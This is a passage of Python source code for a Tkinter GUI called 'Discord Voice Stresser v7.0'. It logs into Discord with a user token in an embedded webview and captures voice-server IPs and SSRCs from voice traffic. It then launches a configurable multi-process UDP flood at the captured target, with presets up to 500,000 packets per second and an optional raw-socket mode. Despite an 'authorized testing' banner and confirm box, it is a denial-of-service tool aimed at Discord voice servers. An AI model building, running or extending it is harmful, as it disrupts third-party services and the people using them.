        self.ssrc_label.pack(fill=X, padx=8)
        
        # ─── CENTER PANEL ───
        center = Frame(main, bg=self.BG2, bd=1, relief="solid",
                      highlightbackground=self.BORDER, highlightthickness=1)
        center.pack(side=LEFT, fill=BOTH, padx=3)
        
        # Target Config
        self._header(center, "🎯 TARGET CONFIGURATION")
        
        ti = Frame(center, bg=self.BG2)
        ti.pack(fill=X, padx=8, pady=3)
        
        Label(ti, text="TARGET IP:", bg=self.BG2, fg=self.DIM,
              font=("Consolas", 8, "bold")).pack(anchor=W)
        
        self.target_entry = Entry(ti, textvariable=self.target_ip,
                                 bg=self.BG, fg=self.RED,
                                 insertbackground=self.RED,
                                 font=("Consolas", 14, "bold"),
                                 bd=1, relief="sunken",
                                 highlightbackground=self.BORDER,
                                 highlightthickness=1)
        self.target_entry.pack(fill=X, pady=2)
        
        tp = Frame(center, bg=self.BG2)
        tp.pack(fill=X, padx=8, pady=2)
        
        Label(tp, text="PORT:", bg=self.BG2, fg=self.DIM,
              font=("Consolas", 8, "bold")).pack(side=LEFT)
        
        self.port_entry = Entry(tp, textvariable=self.target_port,
                               bg=self.BG, fg=self.RED,
                               insertbackground=self.RED,
                               font=("Consolas", 10, "bold"),
                               width=8, bd=1, relief="sunken",
                               highlightbackground=self.BORDER,
                               highlightthickness=1)
        self.port_entry.pack(side=LEFT, padx=(5, 0))
        
        Label(tp, text="(Default: 50000-60000 for Discord voice)", bg=self.BG2,
              fg=self.DIM, font=("Consolas", 7)).pack(side=LEFT, padx=8)
        
        self.target_display = Label(center, text="Not set", bg=self.BG,
                                    fg=self.RED,
                                    font=("Consolas", 12, "bold"),
                                    bd=1, relief="sunken",
                                    highlightbackground=self.BORDER,
                                    highlightthickness=1,
                                    anchor=CENTER, height=2)
        self.target_display.pack(fill=X, padx=8, pady=3)
        
        self.target_status = Label(center, text="○ IDLE", bg=self.BG2,
                                   fg=self.DIM, font=("Consolas", 7, "bold"))
        self.target_status.pack()
        
        # SSRC info
        self.ssrc_info_label = Label(center, text="", bg=self.BG2, fg=self.CYAN,
                                    font=("Consolas", 7))
        self.ssrc_info_label.pack()
        
        # Attack Parameters
        self._header(center, "⚙ ATTACK PARAMETERS")
        right = center
        
        self._slider(right, "PROCESSES:", self.processes_var, 1, 
                    max(1, multiprocessing.cpu_count() * 2), multiprocessing.cpu_count())
        self._slider(right, "PACKETS/SEC:", self.pps_var, 1000, 500000, 50000)
        self._slider(right, "DURATION (s):", self.duration_var, 1, 600, 60)
        self._slider(right, "PACKET SIZE:", self.psize_var, 64, 1400, 400)
        
        # Raw socket checkbox
        rf = Frame(right, bg=self.BG2)
        rf.pack(fill=X, padx=8, pady=3)
        self.raw_cb = Checkbutton(rf, text="🔌 RAW SOCKET MODE (requires admin)",
                                 variable=self.raw_var, bg=self.BG2, fg=self.WHITE,
                                 selectcolor=self.BG, activebackground=self.BG2,
                                 activeforeground=self.YELLOW,
                                 font=("Consolas", 8, "bold"), relief="flat",
                                 bd=0, highlightthickness=0)
        self.raw_cb.pack(side=LEFT)
        raw_status = "✓ Available" if HAS_RAW_SOCKET else "✗ Requires Admin"
        Label(rf, text=raw_status, bg=self.BG2,
              fg=self.GREEN if HAS_RAW_SOCKET else self.RED,
              font=("Consolas", 7)).pack(side=RIGHT)
        
        # Presets
        self._header(right, "QUICK PRESETS")
        pf = Frame(right, bg=self.BG2)
        pf.pack(fill=X, padx=8, pady=3)
        
        btn = {"bg": "#1a1a3a", "fg": self.CYAN, "activebackground": "#2a2a5a",
               "activeforeground": "#00ccff", "font": ("Consolas", 7, "bold"),
               "bd": 1, "cursor": "hand2", "relief": "raised", "padx": 5, "pady": 2}
        
        cpu = multiprocessing.cpu_count()
        presets = [
            ("Light", 2, 10000, 30),
            ("Medium", cpu//2, 50000, 30),
            ("Heavy", cpu, 100000, 60),
            ("Extreme", cpu, 250000, 60),
            ("MAX", cpu*2, 500000, 120),
        ]
        for text, p, pp, d in presets:
            Button(pf, text=text,
                   command=lambda tt=p, pp=pp, dd=d: self._preset(tt, pp, dd),
                   **btn).pack(side=LEFT, padx=1)
        
        # Start/Stop button
        self.start_btn = Button(right, text="▶  LAUNCH ATTACK",
                               command=self._toggle_attack,
                               bg="#004422", fg=self.GREEN,
                               activebackground="#006633", activeforeground="#00ff88",
                               font=("Consolas", 14, "bold"), bd=0,
                               padx=20, pady=12, cursor="hand2",
                               relief="raised")
        self.start_btn.pack(fill=X, padx=8, pady=(8, 5))
        
        # ─── BOTTOM ───
        bottom = Frame(main, bg=self.BG)
        bottom.pack(fill=BOTH, expand=True, pady=(3, 0))
        
        # Stats
        stats_frame = Frame(bottom, bg=self.BG2, bd=1, relief="solid",
                           highlightbackground=self.BORDER, highlightthickness=1)
        stats_frame.pack(side=LEFT, fill=BOTH, expand=True, padx=(0, 3))
        
        hdr = Frame(stats_frame, bg=self.BORDER, height=22)
        hdr.pack(fill=X)
        Label(hdr, text="  📊 LIVE STATISTICS", bg=self.BORDER,
              fg=self.GREEN, font=("Consolas", 9, "bold")).pack(side=LEFT)
        
        sg = Frame(stats_frame, bg=self.BG2)
        sg.pack(fill=X, padx=5, pady=3)
        
        self._stat_labels = {}
        stats = [
            ("PROCESSES", "0", "procs"),
            ("PACKETS/SEC", "0", "pps"),
            ("PACKET SIZE", "0", "psize"),
            ("CORES", "0", "cores"),
            ("BANDWIDTH", "0 Mbps", "mbps"),
            ("RUNTIME", "00:00", "runtime"),
            ("RAW MODE", "OFF", "raw"),
            ("STATUS", "IDLE", "status"),
        ]
        
        for i, (name, default, key) in enumerate(stats):
            cell = Frame(sg, bg=self.BG, bd=1, relief="sunken",
                        highlightbackground=self.BORDER, highlightthickness=1)
            cell.grid(row=i//4, column=i%4, padx=1, pady=1, sticky="nsew")
            
            val = Label(cell, text=default, bg=self.BG, fg=self.GREEN,
                       font=("Consolas", 10, "bold"))
            val.pack(expand=True, pady=(4, 0))
            Label(cell, text=name, bg=self.BG, fg=self.DIM,
                 font=("Consolas", 6)).pack(fill=X, padx=2, pady=(0, 3))
            
            self._stat_labels[key] = val
        
        for i in range(4):
            sg.grid_columnconfigure(i, weight=1, uniform="s")
        
        # Graph
        gf = Frame(stats_frame, bg=self.BG2)
        gf.pack(fill=X, padx=5, pady=2)
        self.graph = Canvas(gf, bg=self.BG, height=40, highlightthickness=1,
                           highlightbackground=self.BORDER)
        self.graph.pack(fill=X)
        self._draw_graph()
        
        # Console
        console_frame = Frame(bottom, bg=self.BG2, bd=1, relief="solid",
                             highlightbackground=self.BORDER, highlightthickness=1)
        console_frame.pack(side=RIGHT, fill=BOTH, expand=True, padx=(3, 0))
        
        hdr = Frame(console_frame, bg=self.BORDER, height=22)
        hdr.pack(fill=X)
        Label(hdr, text="  📝 CONSOLE", bg=self.BORDER,
              fg=self.YELLOW, font=("Consolas", 9, "bold")).pack(side=LEFT)
        
        self.console = scrolledtext.ScrolledText(
            console_frame, bg="#0a0a0a", fg=self.WHITE,
            insertbackground=self.GREEN, font=("Consolas", 8),
            bd=1, relief="sunken", highlightbackground=self.BORDER,
            highlightthickness=1, state="disabled", height=6,
        )
        self.console.pack(fill=BOTH, expand=True, padx=5, pady=5)
        
        # Status bar
        sb = Frame(main, bg=self.BG, bd=1, relief="sunken",
                   highlightbackground=self.BORDER, highlightthickness=1)
        sb.pack(fill=X, side=BOTTOM)
        
        self.status = Label(sb, 
            text="⏻ READY | Enter token → Open WebView → Start Capture → Join Voice",
            bg=self.BG, fg=self.DIM, font=("Consolas", 8), anchor=W)
        self.status.pack(side=LEFT, padx=5)
        
        Label(main, text="Ctrl+Enter: Attack/Stop  |  Esc: Stop  |  F11: Fullscreen",
              bg=self.BG, fg=self.DIM, font=("Consolas", 7)).pack(side=BOTTOM)
        
        # Console tags
        self.console.tag_config("ts", foreground=self.DIM)
        self.console.tag_config("red", foreground=self.RED)
        self.console.tag_config("green", foreground=self.GREEN)
        self.console.tag_config("cyan", foreground=self.CYAN)
        self.console.tag_config("yellow", foreground=self.YELLOW)
        self.console.tag_config("orange", foreground=self.ORANGE)
        self.console.tag_config("border", foreground=self.BORDER)
        self.console.tag_config("bold", font=("Consolas", 8, "bold"))
    
    def _header(self, parent, text):
        f = Frame(parent, bg=self.BG)
        f.pack(fill=X, padx=5, pady=(4, 2))
        Label(f, text=f"─── {text} ───", bg=self.BG, fg=self.CYAN,
              font=("Consolas", 7, "bold")).pack()
    
    def _slider(self, parent, label, var, mn, mx, default):
        f = Frame(parent, bg=self.BG2)
        f.pack(fill=X, padx=8, pady=1)
        
        Label(f, text=label, bg=self.BG2, fg=self.DIM,
              font=("Consolas", 8, "bold"), width=14, anchor=W).pack(side=LEFT)
        
        vl = Label(f, text=str(default), bg=self.BG2, fg=self.CYAN,
                  font=("Consolas", 9, "bold"), width=8)
        vl.pack(side=RIGHT)
        
        s = Scale(f, from_=mn, to=mx, orient=HORIZONTAL, variable=var,
                 bg=self.BG2, fg=self.GREEN, troughcolor=self.BG3,
                 activebackground=self.CYAN, highlightthickness=0, bd=0,
                 sliderlength=12, font=("Consolas", 6), length=80)
        s.pack(side=RIGHT, fill=X, expand=True, padx=5)
        
        def update(*a): vl.config(text=str(var.get()))
        var.trace_add("write", update)
    
    def _draw_graph(self):
        self.graph.delete("all")
        w = self.graph.winfo_width() or 400
        h = self.graph.winfo_height() or 40
        
        self.graph.create_rectangle(0, 0, w, h, fill=self.BG, outline=self.BORDER)
        
        if not self._graph_data or max(self._graph_data) == 0:
            self.graph.create_text(w//2, h//2, text="WAITING...",
                                  fill=self.DIM, font=("Consolas", 6))
            return
        
        mx = max(self._graph_data) or 1
        bw = max(3, (w - 10) / len(self._graph_data))
        
        for i, val in enumerate(self._graph_data):
            bh = (val / mx) * (h - 10)
            x = 5 + i * bw
            r = val / mx
            if r > 0.8: color = self.RED
            elif r > 0.5: color = self.ORANGE
            elif r > 0.2: color = self.YELLOW
            else: color = self.GREEN
            self.graph.create_rectangle(x, h - bh - 5, x + bw - 2, h - 5,
                                       fill=color, outline="")
    
    def log(self, msg, tag=None):
        def _do():
            try:
                self.console.config(state="normal")
                ts = datetime.now().strftime("%H:%M:%S")
                self.console.insert(END, f"[{ts}] ", "ts")
                if tag:
                    self.console.insert(END, f"{msg}\n", tag)
                else:
                    self.console.insert(END, f"{msg}\n")
                self.console.see(END)
                self.console.config(state="disabled")
            except:
                pass
        self.root.after(0, _do)
    
    def _animate_banner(self):
        """Animate the banner text colors."""
        colors = [self.GREEN, self.CYAN, self.YELLOW, self.PINK]
        def cycle(i=0):
            try:
                for widget in self.root.winfo_children():
                    for child in widget.winfo_children():
                        if isinstance(child, Label) and child.cget('text') == "MATRIXHARDIK":
                            child.config(fg=colors[i % len(colors)])
                            break
            except:
                pass
            self.root.after(1500, lambda: cycle(i+1))
        cycle()
    
    def _toggle_token_visible(self):
        if self.token_entry.cget('show') == '•':
            self.token_entry.config(show='')
        else:
            self.token_entry.config(show='•')
    
    def _bind_hotkeys(self):
        self.root.bind('<Control-Return>', lambda e: self._toggle_attack())
        self.root.bind('<Escape>', lambda e: self._stop_attack())
        self.root.bind('<F11>', lambda e: self._toggle_fullscreen())
    
    # ─── WEBVIEW METHODS ───
    def _toggle_webview(self):
        if self.webview.is_running():
            self._close_webview()
        else:
            self._open_webview()
    
    def _open_webview(self):
        token = self.token_var.get().strip()
        if not token:
            messagebox.showwarning("No Token", "Enter your Discord token first!")
            return
        
        if not HAS_WEBVIEW:
            messagebox.showerror("Missing Dependency",
                "pywebview is not installed.\n\nRun: pip install pywebview")
            return
        
        self.log("[*] Opening Discord WebView...", "yellow")
        self.webview_btn.config(text="⏳ OPENING...", bg="#442200", fg=self.YELLOW)
        self.webview_status.config(text="● OPENING", fg=self.YELLOW)
        
        threading.Thread(target=self._webview_thread, args=(token,), daemon=True).start()
    
    def _webview_thread(self, token: str):
        self.webview.open(token)
    
    def _close_webview(self):
        self.webview.close()
        self.interceptor.stop()
        self.webview_status.config(text="○ CLOSED", fg=self.DIM)
        self.webview_btn.config(text="🌐 OPEN DISCORD WEBVIEW", bg="#003366", fg=self.CYAN)
        self.log("[*] WebView closed.", "yellow")
    
    def _on_webview_event(self, event_type: str, message: str):
        def update():
            if event_type == 'open':
                self.webview_status.config(text="● RUNNING", fg=self.GREEN)
                self.webview_btn.config(text="✖ CLOSE WEBVIEW", bg="#440000", fg=self.RED)
                self.log("[+] WebView opened! Discord should be logged in.", "green")
                self.log("[*] Now click 'START CAPTURE' below.", "yellow")
            elif event_type == 'closed':
                self.webview_status.config(text="○ CLOSED", fg=self.DIM)
                self.webview_btn.config(text="🌐 OPEN DISCORD WEBVIEW", bg="#003366", fg=self.CYAN)
                self.log("[*] WebView closed.", "yellow")
            elif event_type == 'error':
                self.webview_status.config(text="✗ ERROR", fg=self.RED)
                self.webview_btn.config(text="🌐 OPEN DISCORD WEBVIEW", bg="#003366", fg=self.CYAN)
                self.log(f"[!] WebView error: {message}", "red")
        self.root.after(0, update)
    
    # ─── CAPTURE METHODS ───
    def _toggle_capture(self):
        if self.interceptor._running:
            self._stop_capture()
        else:
            self._start_capture()
    
    def _start_capture(self):
        if not self.webview.is_running():
            messagebox.showwarning("WebView Not Open", "Open the Discord WebView first!")
            return
        
        # Ensure interceptor is running
        if not self.interceptor._running:
            self.interceptor.start()
        
        self.capture_btn.config(text="■  STOP CAPTURE", bg="#440000",
                                fg=self.RED, activebackground="#660000")
        self.capture_status.config(text="● LISTENING", fg=self.RED)
        self.log("[*] Voice IP capture started...", "green")
        self.log("[*] Now join a voice channel in the Discord WebView window!", "yellow")
        self.log("[*] The voice server IP will appear automatically below.", "cyan")
    
    def _stop_capture(self):
        self.capture_btn.config(text="▶  START CAPTURE", bg="#004422",
                                fg=self.GREEN, activebackground="#006633")
        self.capture_status.config(text="○ STOPPED", fg=self.DIM)
        self.log("[*] Voice IP capture stopped.", "yellow")
    
    def _on_capture(self, ctype: str, *args):
        def update():
            if ctype == 'voice_ws':
                ip, port = args
                entry = f"{ip}:{port}"
                if entry not in self.ip_listbox.get(0, END):
                    self.ip_listbox.insert(END, entry)
                    self.log(f"[+] Voice WebSocket detected: {entry}", "green")
            
            elif ctype == 'voice_ready':
                ip, port, ssrc = args
                entry = f"{ip}:{port}"
                if entry not in self.ip_listbox.get(0, END):
                    self.ip_listbox.insert(END, entry)
                    self.log(f"[+] Voice Ready! Server: {entry} | SSRC: {ssrc}", "green")
                self._selected_ssrc = ssrc
                self.ssrc_label.config(text=f"SSRC: {ssrc}", fg=self.CYAN)
                self.ssrc_info_label.config(text=f"SSRC: {ssrc} (captured from voice WS)", fg=self.CYAN)
            
            elif ctype == 'ip_discovery':
                ip, port = args
                entry = f"{ip}:{port}"
                if entry not in self.ip_listbox.get(0, END):
                    self.ip_listbox.insert(END, entry)
                    self.log(f"[+] IP discovery: {entry}", "green")
            
            self.discovered_count.config(
                text=f"Captured: {self.ip_listbox.size()} servers")
        
        self.root.after(0, update)
    
    def _clear_captured(self):
        self.ip_listbox.delete(0, END)
        self.discovered_count.config(text="Captured: 0 servers")
        self.ssrc_label.config(text="")
        self.ssrc_info_label.config(text="")
        self._selected_ssrc = None
        self.log("[*] Cleared captured IPs list.", "yellow")
    
    def _on_ip_select(self, event=None):
        selection = self.ip_listbox.curselection()
        if not selection:
            return
        
        entry = self.ip_listbox.get(selection[0])
        if ':' in entry:
            ip, port = entry.split(':', 1)
            self.target_ip.set(ip)
            self.target_port.set(port)
            self._update_target_display()
            self.log(f"[+] Selected target: {entry}", "green")
    
    def _set_manual_ip(self):
        ip = self.target_ip.get().strip()
        port = self.target_port.get().strip()
        if ip and port:
            self._update_target_display()
            self.log(f"[*] Target set manually: {ip}:{port}", "yellow")
    
    def _update_target_display(self):
        ip = self.target_ip.get()
        port = self.target_port.get()
        if ip and port:
            self.target_display.config(text=f"{ip}:{port}", fg=self.RED)
        else:
            self.target_display.config(text="Not set", fg=self.RED)
    
    # ─── ATTACK METHODS ───
    def _preset(self, procs, pps, duration):
        self.processes_var.set(procs)
        self.pps_var.set(pps)
        self.duration_var.set(duration)
        self.log(f"Preset: {procs}P | {pps:,} pps | {duration}s", "yellow")
    
    def _toggle_attack(self):
        if self._running:
            self._stop_attack()
        else:
            self._start_attack()
    
    def _start_attack(self):
        ip = self.target_ip.get().strip()
        port_str = self.target_port.get().strip()
        
        if not ip or not port_str:
            messagebox.showwarning("No Target", "Capture a voice IP first, or enter one manually!")
            return
        
        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
            messagebox.showerror("Invalid IP", "Enter a valid IPv4 address")
            return
        
        try:
            port = int(port_str)
            if not 1 <= port <= 65535:
                raise ValueError
        except:
            messagebox.showerror("Invalid Port", "1-65535")
            return
        
        procs = self.processes_var.get()
        pps = self.pps_var.get()
        duration = self.duration_var.get()
        psize = self.psize_var.get()
        use_raw = self.raw_var.get() and HAS_RAW_SOCKET
        
        total_mbps = (pps * psize * 8) / 1_000_000
        
        if not messagebox.askokcancel(
            "CONFIRM ATTACK",
            f"Target: {ip}:{port}\n"
            f"Processes: {procs} (cores: {multiprocessing.cpu_count()})\n"
            f"Rate: {pps:,} pps ({total_mbps:.0f} Mbps)\n"
            f"Duration: {duration}s\n"
            f"Raw Mode: {'ON' if use_raw else 'OFF'}\n\n"
            f"You have authorization for this test?"
        ):
            return
        
        self._running = True
        self.start_btn.config(text="■  STOP ATTACK", bg="#440000",
                             fg=self.RED, activebackground="#660000")
        self.target_status.config(text="● ATTACKING", fg=self.RED)
        
        self.log(f"╔═══ ATTACK LAUNCHED ═══╗", "red")
        self.log(f"Target: {ip}:{port}", "red")
        self.log(f"Processes: {procs} | Rate: {pps:,} pps", "red")
        self.log(f"Bandwidth: {total_mbps:.0f} Mbps | Raw: {'ON' if use_raw else 'OFF'}", "red")
        self.log(f"Duration: {duration}s | SSRC: {self._selected_ssrc or 'random'}", "red")
        
        self.engine.start(ip, port, procs, pps, duration, psize, use_raw, self._selected_ssrc)
    
    def _stop_attack(self):
        self._running = False
        self.engine.stop()
        
        self.start_btn.config(text="▶  LAUNCH ATTACK", bg="#004422",
                             fg=self.GREEN, activebackground="#006633")
        self.target_status.config(text="○ IDLE", fg=self.DIM)
        self.log(f"╔═══ ATTACK STOPPED ═══╗", "cyan")
    
    def _update_stats(self):
        stats = self.engine.get_stats()
        
        labels = self._stat_labels
        labels["procs"].config(text=f"{len(self.engine._processes)}")
        labels["pps"].config(text=f"{self.pps_var.get():,}")
        labels["psize"].config(text=f"{self.psize_var.get()} B")
        labels["cores"].config(text=f"{multiprocessing.cpu_count()}")
        
        mbps = (self.pps_var.get() * self.psize_var.get() * 8) / 1_000_000
        labels["mbps"].config(text=f"{mbps:.0f} Mbps")
        
        mins = int(stats['elapsed']) // 60
        secs = int(stats['elapsed']) % 60
        labels["runtime"].config(text=f"{mins:02d}:{secs:02d}")
        
        labels["raw"].config(
            text="ON" if self.raw_var.get() and HAS_RAW_SOCKET else "OFF",
            fg=self.GREEN if (self.raw_var.get() and HAS_RAW_SOCKET) else self.RED
        )
        
        labels["status"].config(
            text="RUNNING" if stats['running'] else "IDLE",
            fg=self.RED if stats['running'] else self.DIM
        )
        
        # Graph
        self._graph_data.append(self.pps_var.get() if stats['running'] else 0)
        if len(self._graph_data) > 60:
            self._graph_data.pop(0)
        self._draw_graph()
        
        # Status bar
        if stats['running']:
            self.status.config(
                text=f"▶ ATTACKING | {len(self.engine._processes)} processes | {self.pps_var.get():,} pps",
                fg=self.RED)
        elif self.webview.is_running():
            self.status.config(
                text="● WEBVIEW OPEN | Start Capture → Join Voice → IP auto-extracts",
                fg=self.CYAN)
        else:
            self.status.config(
                text="⏻ READY | Enter token → Open WebView → Start Capture → Join Voice",
                fg=self.DIM)
        
        self._update_target_display()
    
    def _start_stats_loop(self):
        def loop():
            while True:
                try:
                    self.root.after(0, self._update_stats)
                except:
                    pass
                time.sleep(0.5)
        threading.Thread(target=loop, daemon=True).start()
    
    def _toggle_fullscreen(self):
        self.root.attributes('-fullscreen', not self.root.attributes('-fullscreen'))
    
    def _close(self):
        self._running = False
        self.webview.close()
        self.interceptor.stop()
        self.engine.stop()
        self.root.destroy()
    
    def run(self):
        self.root.mainloop()


# ═══════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ═══════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    multiprocessing.freeze_support()
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║                                                                 ║
    ║     ███╗   ███╗ █████╗ ████████╗██████╗ ██╗██╗  ██╗           ║
    ║     ████╗ ████║██╔══██╗╚══██╔══╝██╔══██╗██║██║  ██║           ║
    ║     ██╔████╔██║███████║   ██║   ██████╔╝██║███████║           ║
    ║     ██║╚██╔╝██║██╔══██║   ██║   ██╔══██╗██║██╔══██║           ║
    ║     ██║ ╚═╝ ██║██║  ██║   ██║   ██║  ██║██║██║  ██║           ║
    ║     ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝           ║
    ║                                                                 ║
    ║     DISCORD VOICE STRESSER v7.0                                ║
    ║     WebView Integration — Real Discord UI                      ║
    ║     FOR AUTHORIZED TESTING ONLY                                ║
    ║                                                                 ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    
    print("[*] Requirements: pip install pywebview")
    print("[*] This version embeds a real Discord webapp with")
    print("[*] automatic token login and voice IP capture.")
    print()
    
    try:
        app = DiscordVoiceStresserGUI()
        app.run()
    except Exception as e:
        print(f"[!] Fatal: {e}")
        import traceback
        traceback.print_exc()
        input("\nPress Enter...")